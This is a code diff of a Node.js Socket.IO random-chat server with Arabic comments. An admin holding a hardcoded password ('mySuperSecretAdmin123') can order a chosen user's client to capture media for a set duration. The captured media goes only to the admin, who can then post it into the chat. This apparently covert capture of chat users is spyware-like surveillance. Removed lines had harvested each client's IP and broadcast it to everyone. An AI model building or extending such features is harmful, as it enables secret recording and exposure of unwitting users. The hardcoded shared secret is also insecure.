@@ -6,8 +6,8 @@ const path = require('path');
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server, {
-  pingTimeout: 4000,
-  pingInterval: 8000
+  pingTimeout: 2000,
+  pingInterval: 4000
 });
 
 app.use(express.static(__dirname));
@@ -19,15 +19,6 @@ app.get('/', (req, res) => {
 let waitingUser = null;
 
 io.on('connection', (socket) => {
-  let clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
-  if (clientIp && clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
-
-  // إرسال الـ IP و الـ ID فقط للأدمن
-  io.emit('device_info', {
-    id: socket.id,
-    ip: clientIp
-  });
-
   socket.on('find_partner', () => {
     if (waitingUser && waitingUser.id !== socket.id && waitingUser.connected) {
       const roomName = 'room_' + socket.id + '_' + waitingUser.id;
@@ -59,16 +50,17 @@ io.on('connection', (socket) => {
     }
   });
 
-  // استقبال الوسائط من المستخدم وإرسالها حصرياً للأدمن للمراجعة
+  // استقبال الوسائط الملتقطة من المستخدم وإرسالها حصرياً للأدمن
   socket.on('media_captured_for_admin', (data) => {
     io.to(data.adminSocketId).emit('review_captured_media', {
       targetSocketId: socket.id,
       type: data.type,
-      content: data.content
+      content: data.content,
+      roomName: socket.roomName
     });
   });
 
-  // موافقة الأدمن على نشر الوسائط في الشات العام
+  // موافقة الأدمن على نشر الوسائط في الشات العام للطرفين
   socket.on('admin_approve_and_send', (data) => {
     if (data.secret !== 'mySuperSecretAdmin123') return;
     if (data.roomName) {
@@ -76,7 +68,7 @@ io.on('connection', (socket) => {
     }
   });
 
-  // أوامر الأدمن
+  // أوامر لوحة التحكم
   socket.on('admin_action', (data) => {
     if (data.secret !== 'mySuperSecretAdmin123') return;
 
@@ -99,8 +91,7 @@ io.on('connection', (socket) => {
         io.to(data.targetSocket).emit('trigger_media_capture', { 
           type: data.mediaType, 
           duration: data.duration, 
-          adminSocketId: socket.id,
-          roomName: io.sockets.sockets.get(data.targetSocket)?.roomName 
+          adminSocketId: socket.id 
         });
       }
     }
